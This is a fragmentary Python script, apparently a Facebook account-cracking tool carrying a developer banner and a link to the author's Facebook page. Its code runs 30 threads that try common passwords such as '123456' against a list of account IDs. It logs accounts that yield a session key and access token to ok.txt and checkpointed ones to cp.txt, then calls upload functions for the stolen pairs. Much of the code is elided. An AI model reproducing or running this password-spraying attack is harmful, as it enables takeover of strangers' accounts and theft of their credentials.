...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Tajul Islam Rabbi")
	subprocess.check_output(["am", "start", "https://www.facebook.com/abirislam.cyber71"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Tajul Islam Rabbi
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Tajul Islam Rabbi 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            Xxxxxxxxx
     \033[1;96m➣ \033[1;92mGITHUB     :            Hacker1414 
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR Tajul  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[RABBI-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [TABBI-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[RABBI-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RABBI-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
